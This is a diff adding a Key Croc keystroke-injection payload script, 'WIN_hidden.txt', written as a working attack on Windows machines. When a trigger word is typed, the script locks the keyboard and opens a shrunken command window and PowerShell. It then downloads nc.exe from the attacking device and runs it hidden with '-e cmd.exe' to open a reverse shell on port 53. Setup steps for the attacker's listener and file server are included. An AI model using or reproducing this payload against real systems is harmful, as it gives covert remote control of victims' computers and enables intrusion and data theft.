@@ -1,0 +1,53 @@
+#Title: WIN_hidden.txt
+#Discription: A simple reverse shell with the help of netcat.
+#Author: 0iphor13
+#Version: 1.0
+#Target: Windows (Tested on 7 and 10)
+
+MATCH nchidden
+
+export DUCKY_LANG=de
+
+##################################################################################################
+#                        1.Install Netcat on the Keycroc					 #
+#        2.Start listener with nc -lvnp portnumber and background the process with ctrl+ Z	 #
+#        3.Upload nc.exe or others to the Keycroc and start a python HTTP Server		 #
+# 4.After seeing the traffic, close the python server and use fg to foreground the netcat session#
+##################################################################################################
+
+##################Define crocs IP and port########################################################
+croc_ip=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
+croc_port=53
+##################################################################################################
+
+QUACK LOCK
+
+###################################Open Powershell################################################
+
+Q GUI r
+DELAY 500
+Q STRING "cmd /k mode con: cols=15 lines=1"
+DELAY 500
+Q ENTER
+Q STRING powershell
+DELAY 500
+Q ENTER
+
+################################Download nc.exe from croc#########################################
+
+Q STRING "cd C:\Users\Public\Downloads"
+DELAY 500
+Q ENTER
+
+Q STRING "(New-Object System.Net.WebClient).DownloadFile('http://${croc_ip}:8080/nc.exe','C:\Users\Public\Downloads\nc.exe')"
+DELAY 1000
+Q ENTER
+
+#######################################Execute nc.exe#############################################
+
+Q STRING "powershell.exe -WindowStyle hidden -Command .\nc.exe '${croc_ip}' 53 -e cmd.exe"
+DELAY 500
+Q ENTER
+
+QUACK UNLOCK
+
